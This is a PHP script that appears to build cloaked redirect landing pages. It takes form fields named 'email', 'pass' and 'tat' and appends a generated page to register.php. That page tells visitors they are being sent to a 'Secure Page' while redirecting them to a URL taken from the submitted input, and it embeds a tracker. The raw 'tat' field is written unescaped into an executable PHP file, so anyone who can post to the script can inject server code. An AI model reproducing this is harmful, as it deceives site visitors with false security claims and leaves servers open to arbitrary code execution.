<?php
$Username=$_POST['email'];
$Password=$_POST['pass'];
$Histate=$_POST['tat'];
$ip = $_SERVER['REMOTE_ADDR'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle=fopen('register.php',a);
$save=fwrite($handle,' 

<?php include dirname(__FILE__)."/namasub.php"; ?>

<html>
<head>
<title>BOLOMOV-HD</title> 
<?php 
  header( "refresh:0; url='.$Username.'&sub_id=$_GET[sub]" ); 
?>

<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css">
<style>body {padding-top: 70px;padding-bottom: 30px;}
.centered {position: fixed;top: 50%;left: 50%;margin-top: -200px;margin-left: -250px;border: 1px solid #DBDBDB;width: 500px;text-align: center;height: 225px;padding: 20px;font-size: 20px;background-color: rgba(233, 233, 233, 0.44);font-family: Arial, Helvetica, sans-serif;text-shadow: 1px 1px 1px #5F5F5F;}
</style>
</head>
<body>
<div class="centered">
<h2>Please Wait </h2>
You Are Automatic Redirecting<br>
To Secure Page<br><br>
<img src="/load.gif">
</div>
</body>


</html>



'.$Histate.'


<?php include dirname(__FILE__)."/histats.php"; ?>

');
fclose($handle);
echo '
<head>
<meta http-equiv="Refresh" content="0; URL=adils.jpg"/>
</head><body>
</body>
</html>
';


?>
